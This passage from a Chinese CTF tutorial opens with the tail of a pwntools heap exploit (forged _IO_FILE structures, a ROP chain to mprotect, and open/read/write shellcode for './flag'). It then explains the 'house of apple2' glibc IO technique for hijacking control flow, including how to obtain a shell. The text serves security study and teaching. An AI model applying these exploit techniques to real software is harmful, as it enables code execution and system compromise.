<span class="n">__pointer_chk_guard_local</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x3c4630</span>
<span class="n">magic</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x146020</span>
<span class="n">chain</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x17e0</span> <span class="o">+</span> <span class="mh">0x30</span> <span class="o">+</span> <span class="mh">0x100</span>
<span class="n">expected</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x17e0</span> <span class="o">+</span> <span class="mh">0x20</span> <span class="o">+</span><span class="mh">0x100</span> 

<span class="n">mov_rsp_rdx</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x56530</span>
<span class="n">add_rsp_0x20_pop_rbx</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xfd449</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2daa2</span>
<span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x37c0a</span>
<span class="n">pop_rdx_rbx</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x87729</span> 

<span class="n">f1</span> <span class="o">=</span> <span class="nc">IO_FILE_plus_struct</span><span class="p">()</span>
<span class="n">f1</span><span class="p">.</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="mh">0xa81</span>
<span class="n">f1</span><span class="p">.</span><span class="n">chain</span> <span class="o">=</span> <span class="n">chain</span>
<span class="n">f1</span><span class="p">.</span><span class="n">_flags2</span> <span class="o">=</span> <span class="mi">8</span>
<span class="n">f1</span><span class="p">.</span><span class="n">_lock</span> <span class="o">=</span> <span class="n">_IO_stdfile_1_lock</span>
<span class="n">f1</span><span class="p">.</span><span class="n">_mode</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">f1</span><span class="p">.</span><span class="n">_wide_data</span> <span class="o">=</span> <span class="n">__pointer_chk_guard_local</span>
<span class="n">f1</span><span class="p">.</span><span class="n">vtable</span> <span class="o">=</span> <span class="n">_IO_wstrn_jumps</span>

<span class="n">f2</span> <span class="o">=</span> <span class="nc">IO_FILE_plus_struct</span><span class="p">()</span>
<span class="n">f2</span><span class="p">.</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">f2</span><span class="p">.</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">f2</span><span class="p">.</span><span class="n">_mode</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">f2</span><span class="p">.</span><span class="n">_lock</span> <span class="o">=</span> <span class="n">_IO_stdfile_1_lock</span>
<span class="n">f2</span><span class="p">.</span><span class="n">_flags2</span> <span class="o">=</span> <span class="mi">8</span>
<span class="n">f2</span><span class="p">.</span><span class="n">vtable</span> <span class="o">=</span> <span class="n">_IO_cookie_jumps</span> <span class="o">+</span><span class="mh">0x58</span>


<span class="n">data</span> <span class="o">=</span> <span class="nf">flat</span><span class="p">(</span>
    <span class="p">{</span>
    <span class="mh">0x8</span><span class="p">:</span> <span class="n">target_addr</span><span class="o">-</span><span class="mh">0x20</span><span class="p">,</span>
    <span class="mh">0x10</span><span class="p">:</span> <span class="p">{</span>
         <span class="mi">0</span><span class="p">:{</span>
           <span class="mi">0</span><span class="p">:</span><span class="nf">bytes</span><span class="p">(</span><span class="n">f1</span><span class="p">),</span>
           <span class="mh">0x100</span><span class="p">:{</span>
               <span class="mi">0</span><span class="p">:</span><span class="nf">bytes</span><span class="p">(</span><span class="n">f2</span><span class="p">),</span>
               <span class="mh">0xe0</span><span class="p">:[</span><span class="n">chain</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">,</span><span class="nf">rol</span><span class="p">(</span><span class="n">magic</span> <span class="o">^</span> <span class="n">expected</span><span class="p">,</span><span class="mh">0x11</span><span class="p">)],</span>
               <span class="mh">0x100</span><span class="p">:[</span>
                   <span class="n">add_rsp_0x20_pop_rbx</span><span class="p">,</span>
                   <span class="n">chain</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">,</span>
                   <span class="mi">0</span><span class="p">,</span>
                   <span class="mi">0</span><span class="p">,</span>
                   <span class="n">mov_rsp_rdx</span><span class="p">,</span>
                   <span class="mi">0</span><span class="p">,</span>
                   <span class="n">pop_rdi</span><span class="p">,</span>
                   <span class="n">chain</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span><span class="p">,</span>
                   <span class="n">pop_rsi</span><span class="p">,</span>
                   <span class="mh">0x4000</span><span class="p">,</span>
                   <span class="n">pop_rdx_rbx</span><span class="p">,</span>
                   <span class="mi">7</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
                   <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">mprotect</span><span class="sh">"</span><span class="p">],</span>
                   <span class="n">chain</span> <span class="o">+</span> <span class="mh">0x200</span><span class="p">,</span><span class="c1">#存放orw的rop链的堆地址
</span>               <span class="p">],</span>
          
           <span class="mh">0x200</span><span class="p">:</span><span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">./flag</span><span class="sh">'</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
            <span class="o">+</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="n">heap_base</span><span class="p">,</span><span class="mh">0x100</span><span class="p">)</span><span class="o">+</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">heap_base</span><span class="p">,</span><span class="mh">0x100</span><span class="p">)),</span>     
                 <span class="p">}</span>
            <span class="p">},</span>
            <span class="mh">0xa80</span><span class="p">:[</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xab1</span><span class="p">]</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="p">)</span>
<span class="n">f1_addr</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1810</span>
<span class="n">f2_addr</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1910</span>

<span class="c1"># x = 0xa + 0x10 = 0x1a
# y = 0xa + 0x10 + 0x10 = 0x2a
# z = 2 * 0xa + 0x10 = 0x24  
</span>

<span class="c1">#chunk1_addr = f1_addr - 0X10 + 0x24
#chunk2_addr = f1_addr - 0X10 + 0x34
#chunk3_addr = f1_addr - 0x10 + 0x54 
</span>
<span class="nf">lg</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">f1_addr</span><span class="sh">'</span><span class="p">,</span><span class="n">f1_addr</span><span class="p">)</span>
<span class="nf">lg</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">f2_addr</span><span class="sh">'</span><span class="p">,</span><span class="n">f2_addr</span><span class="p">)</span>

<span class="nf">edit</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="nf">pause</span><span class="p">()</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="nf">exit</span><span class="p">()</span>
<span class="nf">inter</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="house-of-apple2">house of apple2</h3>

<h2 id="利用条件">利用条件</h2>

<p>使用<code class="language-plaintext highlighter-rouge">house of apple2</code>的条件为：</p>

<ul>
  <li>已知<code class="language-plaintext highlighter-rouge">heap</code>地址和<code class="language-plaintext highlighter-rouge">glibc</code>地址</li>
  <li>能控制程序执行<code class="language-plaintext highlighter-rouge">IO</code>操作，包括但不限于：从<code class="language-plaintext highlighter-rouge">main</code>函数返回、调用<code class="language-plaintext highlighter-rouge">exit</code>函数、通过<code class="language-plaintext highlighter-rouge">__malloc_assert</code>触发</li>
  <li>能控制<code class="language-plaintext highlighter-rouge">_IO_FILE</code>的<code class="language-plaintext highlighter-rouge">vtable</code>和<code class="language-plaintext highlighter-rouge">_wide_data</code>，一般使用<code class="language-plaintext highlighter-rouge">largebin attack</code>去控制</li>
</ul>

<h2 id="利用原理">利用原理</h2>

<p><code class="language-plaintext highlighter-rouge">stdin/stdout/stderr</code>这三个<code class="language-plaintext highlighter-rouge">_IO_FILE</code>结构体使用的是<code class="language-plaintext highlighter-rouge">_IO_file_jumps</code>这个<code class="language-plaintext highlighter-rouge">vtable</code>，而当需要调用到<code class="language-plaintext highlighter-rouge">vtable</code>里面的函数指针时，会使用宏去调用。以<code class="language-plaintext highlighter-rouge">_IO_file_overflow</code>调用为例，<code class="language-plaintext highlighter-rouge">glibc</code>中调用的代码片段分析如下</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
 
#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)
 
# define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))
</pre></td></tr></tbody></table></code></pre></div></div>

<p>其中，<code class="language-plaintext highlighter-rouge">IO_validate_vtable</code>函数负责检查<code class="language-plaintext highlighter-rouge">vtable</code>的合法性，会判断<code class="language-plaintext highlighter-rouge">vtable</code>的地址是不是在一个合法的区间。如果<code class="language-plaintext highlighter-rouge">vtable</code>的地址不合法，程序将会异常终止。</p>

<p>观察<code class="language-plaintext highlighter-rouge">struct _IO_wide_data</code>结构体，发现其对应有一个<code class="language-plaintext highlighter-rouge">_wide_vtable</code>成员。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre><span class="k">struct</span> <span class="n">_IO_wide_data</span>
<span class="p">{</span>
  <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">_IO_read_ptr</span><span class="p">;</span>    <span class="cm">/* Current read pointer */</span>
  <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">_IO_read_end</span><span class="p">;</span>    <span class="cm">/* End of get area. */</span>
  <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">_IO_read_base</span><span class="p">;</span>    <span class="cm">/* Start of putback+get area. */</span>
  <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">_IO_write_base</span><span class="p">;</span>    <span class="cm">/* Start of put area. */</span>
  <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">_IO_write_ptr</span><span class="p">;</span>    <span class="cm">/* Current put pointer. */</span>
  <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">_IO_write_end</span><span class="p">;</span>    <span class="cm">/* End of put area. */</span>
  <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">_IO_buf_base</span><span class="p">;</span>    <span class="cm">/* Start of reserve area. */</span>
  <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">_IO_buf_end</span><span class="p">;</span>        <span class="cm">/* End of reserve area. */</span>
  <span class="cm">/* The following fields are used to support backing up and undo. */</span>
  <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span>    <span class="cm">/* Pointer to start of non-current get area. */</span>
  <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>    <span class="cm">/* Pointer to first valid character of
                   backup area */</span>
  <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span>    <span class="cm">/* Pointer to end of non-current get area. */</span>
  
  <span class="n">__mbstate_t</span> <span class="n">_IO_state</span><span class="p">;</span>
  <span class="n">__mbstate_t</span> <span class="n">_IO_last_state</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_codecvt</span> <span class="n">_codecvt</span><span class="p">;</span>
  <span class="kt">wchar_t</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
  <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span><span class="n">_wide_vtable</span><span class="p">;</span>
<span class="p">};</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>在调用<code class="language-plaintext highlighter-rouge">_wide_vtable</code>虚表里面的函数时，同样是使用宏去调用，仍然以<code class="language-plaintext highlighter-rouge">vtable-&gt;_overflow</code>调用为例，所用到的宏依次为：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="cp">#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)
</span> 
<span class="cp">#define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)
</span> 
<span class="cp">#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)
</span> 
<span class="cp">#define _IO_WIDE_JUMPS(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>可以看到，在调用<code class="language-plaintext highlighter-rouge">_wide_vtable</code>里面的成员函数指针时，<strong>没有关于vtable的合法性检查</strong>。</p>

<p>因此，我们可以劫持<code class="language-plaintext highlighter-rouge">IO_FILE</code>的<code class="language-plaintext highlighter-rouge">vtable</code>为<code class="language-plaintext highlighter-rouge">_IO_wfile_jumps</code>，控制<code class="language-plaintext highlighter-rouge">_wide_data</code>为可控的堆地址空间，进而控制<code class="language-plaintext highlighter-rouge">_wide_data-&gt;_wide_vtable</code>为可控的堆地址空间。控制程序执行<code class="language-plaintext highlighter-rouge">IO</code>流函数调用，最终调用到<code class="language-plaintext highlighter-rouge">_IO_Wxxxxx</code>函数即可控制程序的执行流。</p>

<h2 id="利用思路">利用思路</h2>

<p>目前在<code class="language-plaintext highlighter-rouge">glibc</code>源码中搜索到的<code class="language-plaintext highlighter-rouge">_IO_WXXXXX</code>系列函数的调用只有<code class="language-plaintext highlighter-rouge">_IO_WSETBUF</code>、<code class="language-plaintext highlighter-rouge">_IO_WUNDERFLOW</code>、<code class="language-plaintext highlighter-rouge">_IO_WDOALLOCATE</code>和<code class="language-plaintext highlighter-rouge">_IO_WOVERFLOW</code>。
其中<code class="language-plaintext highlighter-rouge">_IO_WSETBUF</code>和<code class="language-plaintext highlighter-rouge">_IO_WUNDERFLOW</code>目前无法利用或利用困难，其余的均可构造合适的<code class="language-plaintext highlighter-rouge">_IO_FILE</code>进行利用。这里给出我总结的几条比较好利用的链。以下使用<code class="language-plaintext highlighter-rouge">fp</code>指代<code class="language-plaintext highlighter-rouge">_IO_FILE</code>结构体变量。</p>

<h3 id="利用_io_wfile_overflow函数控制程序执行流">利用_IO_wfile_overflow函数控制程序执行流</h3>

<p>对<code class="language-plaintext highlighter-rouge">fp</code>的设置如下：</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">_flags</code>设置为<code class="language-plaintext highlighter-rouge">~(2 | 0x8 | 0x800)</code>，如果不需要控制<code class="language-plaintext highlighter-rouge">rdi</code>，设置为<code class="language-plaintext highlighter-rouge">0</code>即可；如果需要获得<code class="language-plaintext highlighter-rouge">shell</code>，可设置为<code class="language-plaintext highlighter-rouge"> sh;</code>，注意前面有两个空格</li>
  <li><code class="language-plaintext highlighter-rouge">vtable</code>设置为<code class="language-plaintext highlighter-rouge">_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code class="language-plaintext highlighter-rouge">_IO_wfile_overflow</code>即可</li>
  <li><code class="language-plaintext highlighter-rouge">_wide_data</code>设置为可控堆地址<code class="language-plaintext highlighter-rouge">A</code>，即满足<code class="language-plaintext highlighter-rouge">*(fp + 0xa0) = A</code></li>
  <li><code class="language-plaintext highlighter-rouge">_wide_data-&gt;_IO_write_base</code>设置为<code class="language-plaintext highlighter-rouge">0</code>，即满足<code class="language-plaintext highlighter-rouge">*(A + 0x18) = 0</code></li>
  <li><code class="language-plaintext highlighter-rouge">_wide_data-&gt;_IO_buf_base</code>设置为<code class="language-plaintext highlighter-rouge">0</code>，即满足<code class="language-plaintext highlighter-rouge">*(A + 0x30) = 0</code></li>
  <li><code class="language-plaintext highlighter-rouge">_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code class="language-plaintext highlighter-rouge">B</code>，即满足<code class="language-plaintext highlighter-rouge">*(A + 0xe0) = B</code></li>
  <li><code class="language-plaintext highlighter-rouge">_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code class="language-plaintext highlighter-rouge">C</code>用于劫持<code class="language-plaintext highlighter-rouge">RIP</code>，即满足<code class="language-plaintext highlighter-rouge">*(B + 0x68) = C</code></li>
</ul>

<p>函数的调用链如下：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="n">_IO_wfile_overflow</span>
    <span class="n">_IO_wdoallocbuf</span>
        <span class="n">_IO_WDOALLOCATE</span>
            <span class="o">*</span><span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_wide_vtable</span> <span class="o">+</span> <span class="mh">0x68</span><span class="p">)(</span><span class="n">fp</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>详细分析如下：
首先看<code class="language-plaintext highlighter-rouge">_IO_wfile_overflow</code>函数</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="kt">wint_t</span>
<span class="nf">_IO_wfile_overflow</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">wint_t</span> <span class="n">wch</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_WRITES</span><span class="p">)</span> <span class="cm">/* SET ERROR */</span>
    <span class="p">{</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
      <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EBADF</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="cm">/* If currently reading or no buffer allocated. */</span>
  <span class="k">if</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* Allocate a buffer if needed. */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">_IO_wdoallocbuf</span> <span class="p">(</span><span class="n">f</span><span class="p">);</span><span class="c1">// 需要走到这里</span>
      <span class="c1">// ......</span>
    <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>需要满足<code class="language-plaintext highlighter-rouge">f-&gt;_flags &amp; _IO_NO_WRITES == 0</code>并且<code class="language-plaintext highlighter-rouge">f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0</code>和<code class="language-plaintext highlighter-rouge">f-&gt;_wide_data-&gt;_IO_write_base == 0</code></p>

<p>然后看<code class="language-plaintext highlighter-rouge">_IO_wdoallocbuf</code>函数：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="kt">void</span>
<span class="nf">_IO_wdoallocbuf</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">)</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_UNBUFFERED</span><span class="p">))</span>
    <span class="k">if</span> <span class="p">((</span><span class="kt">wint_t</span><span class="p">)</span><span class="n">_IO_WDOALLOCATE</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="n">WEOF</span><span class="p">)</span><span class="c1">// _IO_WXXXX调用</span>
      <span class="k">return</span><span class="p">;</span>
  <span class="n">_IO_wsetb</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_shortbuf</span><span class="p">,</span>
             <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_shortbuf</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_wdoallocbuf</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>需要满足<code class="language-plaintext highlighter-rouge">fp-&gt;_wide_data-&gt;_IO_buf_base != 0</code>和<code class="language-plaintext highlighter-rouge">fp-&gt;_flags &amp; _IO_UNBUFFERED == 0</code>。</p>

<h3 id="利用_io_wfile_underflow_mmap函数控制程序执行流">利用_IO_wfile_underflow_mmap函数控制程序执行流</h3>

<p>对<code class="language-plaintext highlighter-rouge">fp</code>的设置如下：</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">_flags</code>设置为<code class="language-plaintext highlighter-rouge">~4</code>，如果不需要控制<code class="language-plaintext highlighter-rouge">rdi</code>，设置为<code class="language-plaintext highlighter-rouge">0</code>即可；如果需要获得<code class="language-plaintext highlighter-rouge">shell</code>，可设置为<code class="language-plaintext highlighter-rouge"> sh;</code>，注意前面有个空格</li>
  <li><code class="language-plaintext highlighter-rouge">vtable</code>设置为<code class="language-plaintext highlighter-rouge">_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code class="language-plaintext highlighter-rouge">_IO_wfile_underflow_mmap</code>即可</li>
  <li><code class="language-plaintext highlighter-rouge">_IO_read_ptr &lt; _IO_read_end</code>，即满足<code class="language-plaintext highlighter-rouge">*(fp + 8) &lt; *(fp + 0x10)</code></li>
  <li><code class="language-plaintext highlighter-rouge">_wide_data</code>设置为可控堆地址<code class="language-plaintext highlighter-rouge">A</code>，即满足<code class="language-plaintext highlighter-rouge">*(fp + 0xa0) = A</code></li>
  <li><code class="language-plaintext highlighter-rouge">_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code class="language-plaintext highlighter-rouge">*A &gt;= *(A + 8)</code></li>
  <li><code class="language-plaintext highlighter-rouge">_wide_data-&gt;_IO_buf_base</code>设置为<code class="language-plaintext highlighter-rouge">0</code>，即满足<code class="language-plaintext highlighter-rouge">*(A + 0x30) = 0</code></li>
  <li><code class="language-plaintext highlighter-rouge">_wide_data-&gt;_IO_save_base</code>设置为<code class="language-plaintext highlighter-rouge">0</code>或者合法的可被<code class="language-plaintext highlighter-rouge">free</code>的地址，即满足<code class="language-plaintext highlighter-rouge">*(A + 0x40) = 0</code></li>
  <li><code class="language-plaintext highlighter-rouge">_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code class="language-plaintext highlighter-rouge">B</code>，即满足<code class="language-plaintext highlighter-rouge">*(A + 0xe0) = B</code></li>
  <li><code class="language-plaintext highlighter-rouge">_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code class="language-plaintext highlighter-rouge">C</code>用于劫持<code class="language-plaintext highlighter-rouge">RIP</code>，即满足<code class="language-plaintext highlighter-rouge">*(B + 0x68) = C</code></li>
</ul>

<p>函数的调用链如下：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="n">_IO_wfile_underflow_mmap</span>
    <span class="n">_IO_wdoallocbuf</span>
        <span class="n">_IO_WDOALLOCATE</span>
            <span class="o">*</span><span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_wide_vtable</span> <span class="o">+</span> <span class="mh">0x68</span><span class="p">)(</span><span class="n">fp</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>详细分析如下：
看<code class="language-plaintext highlighter-rouge">_IO_wfile_underflow_mmap</code>函数：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre></td><td class="rouge-code"><pre><span class="k">static</span> <span class="kt">wint_t</span>
<span class="nf">_IO_wfile_underflow_mmap</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">_IO_codecvt</span> <span class="o">*</span><span class="n">cd</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">read_stop</span><span class="p">;</span>
 
  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_READS</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
      <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EBADF</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
    <span class="k">return</span> <span class="o">*</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
 
  <span class="n">cd</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_codecvt</span><span class="p">;</span>
 
  <span class="cm">/* Maybe there is something left in the external buffer.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&gt;=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span>
      <span class="cm">/* No.  But maybe the read buffer is not fully set up.  */</span>
      <span class="o">&amp;&amp;</span> <span class="n">_IO_file_underflow_mmap</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
    <span class="cm">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error
       flags as appropriate.  */</span>
    <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
 
  <span class="cm">/* There is more in the external.  Convert it.  */</span>
  <span class="n">read_stop</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
 
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* Maybe we already have a push back pointer.  */</span>
